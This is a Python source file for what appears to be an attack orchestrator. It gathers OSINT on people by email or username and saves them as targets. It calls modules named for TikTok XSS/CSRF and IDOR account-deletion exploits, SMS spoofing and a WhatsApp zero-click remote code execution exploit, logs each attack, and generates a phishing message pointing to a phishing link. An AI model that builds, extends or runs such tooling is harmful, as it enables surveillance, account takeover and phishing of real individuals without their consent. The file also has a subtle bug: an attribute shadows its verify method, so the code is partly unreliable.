import json
from modules.ai_analysis import AIAnalyzer
from modules.osint import OSINTEngine
from modules.retrieval import ProfileRetriever
from modules.analysis import Analyzer
from modules.tiktok_xss_csrf import TikTokXSS_CSRF
from modules.tiktok_idor_delete import TikTokIDORDelete
from modules.tiktok_sms_spoof import TikTokSMSSpoof
from modules.wa_zero_click import WhatsAppZeroClickRCE
from modules.wa_delivery_fingerprint import WaDeliveryFingerprint
from modules.verification import Verify
from modules.utils import db_insert_target, db_get_target, db_update_target_profile, db_log_attack, db_list_targets
from config import TIKTOK_SESSION, SMS_GATEWAY_API_KEY, SMS_GATEWAY_URL
from plugins import load_plugins

class Orchestrator:
    def __init__(self):
        self.ai = AIAnalyzer(self)
        self.osint = OSINTEngine()
        self.retriever = ProfileRetriever()
        self.tiktok_xss = TikTokXSS_CSRF()
        self.tiktok_idor = TikTokIDORDelete(TIKTOK_SESSION, '123456') if TIKTOK_SESSION else None
        self.tiktok_sms = TikTokSMSSpoof(SMS_GATEWAY_API_KEY, SMS_GATEWAY_URL) if SMS_GATEWAY_API_KEY else None
        self.wa_rce = WhatsAppZeroClickRCE()
        self.wa_fp = WaDeliveryFingerprint()
        self.verify = Verify()

    def track(self, identifier):
        if '@' in identifier:
            res = self.osint.scan_email(identifier)
        else:
            res = self.osint.scan_username(identifier)
        target_id = db_insert_target(identifier, 'auto', res)
        target_data = {'identifier': identifier, 'osint': res}
        ai_result = self.ai.analyze_and_act(target_id, target_data)
        return {'target_id': target_id, 'osint': res, 'ai_action': ai_result}

    def retrieve(self, target_id, platform):
        target = db_get_target(target_id)
        if not target:
            return {'error': 'Target not found'}
        if platform.lower() == 'tiktok':
            profile = self.retriever.get_tiktok_profile(target['identifier'])
            if profile:
                db_update_target_profile(target_id, profile)
                return profile
            return {'error': 'Profile retrieval failed'}
        return {'error': 'Unsupported platform'}

    def analyze(self, target_id):
        target = db_get_target(target_id)
        if not target:
            return {'error': 'Target not found'}
        return Analyzer.generate_report(target_id, target.get('osint', {}), target.get('profile', {}))

    def hack_tiktok(self, username, email):
        xss = self.tiktok_xss.exploit(username, email)
        idor = self.tiktok_idor.exploit('TARGET_ACCOUNT_ID') if self.tiktok_idor else None
        return {'xss': xss, 'idor': idor}

    def hack_whatsapp(self, phone):
        rce = self.wa_rce.exploit(phone)
        fp = self.wa_fp.exploit(phone)
        return {'rce': rce, 'fingerprint': fp}

    def verify(self, target_id, platform):
        target = db_get_target(target_id)
        if not target:
            return {'error': 'Target not found'}
        if platform == 'whatsapp':
            return self.verify.check_whatsapp_registration(target['identifier'])
        return {'success': False, 'output': 'Platform not supported'}

    def log_attack(self, target_id, attack_type, result):
        db_log_attack(target_id, attack_type, result)

    def list_targets(self):
        return db_list_targets()

    def social_engineer(self, params):
        # Generate a realistic phishing message (simplified)
        msg = f"Hi, this is support. We need to verify your account. Please click: http://phishing.link"
        return {'success': True, 'output': msg}
